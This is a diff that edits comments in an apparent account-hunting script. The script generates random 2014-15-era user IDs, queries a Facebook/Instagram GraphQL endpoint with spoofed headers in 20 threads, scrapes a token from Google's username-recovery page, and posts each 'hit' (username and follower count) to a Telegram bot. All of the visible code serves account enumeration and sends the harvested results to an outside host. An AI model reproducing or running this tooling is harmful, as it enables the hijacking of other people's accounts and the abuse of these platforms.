@@ -37,7 +37,6 @@ def get_google_token():
         n1 = ''.join(cc('azertyuiop') for _ in range(rr(6,9)))
         n2 = ''.join(cc('azertyuiop') for _ in range(rr(3,9)))
         res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB')
-        # Optimized regex for Google Token extraction
         match = re.search(r'data-initial-setup-data=".*?&quot;(.*?)&quot;', res1.text)
         if match:
             tok = match.group(1)
@@ -86,7 +85,7 @@ def send_hit_telegram(username, followers):
 """
     print(E + msg)
     try:
-        # Fixed: No brackets [] in the API URL
+        # NO BRACKETS: Fixes the 404/Telegram Message issue
         requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
     except: pass
 
@@ -94,7 +93,7 @@ def worker():
     while True:
         try:
             lsd = ''.join(cc(string.ascii_letters + string.digits) for _ in range(16))
-            # Year 2014-15 specific ID range
+            # ID range targeting 2014-15 active accounts
             id_range = str(rr(1500000000, 2100000000))
             headers = {'user-agent': gg(), 'x-fb-lsd': lsd}
             data = {'lsd': lsd, 'variables': f'{{"id":"{id_range}","render_surface":"PROFILE"}}', 'doc_id': '7397388303713986'}
@@ -113,7 +112,7 @@ def worker():
         except:
             time.sleep(1)
 
-# Threads - 20 threads for high performance on Render
+# Threads - 20 threads optimized for Render
 for _ in range(20):
     Thread(target=worker, daemon=True).start()
 
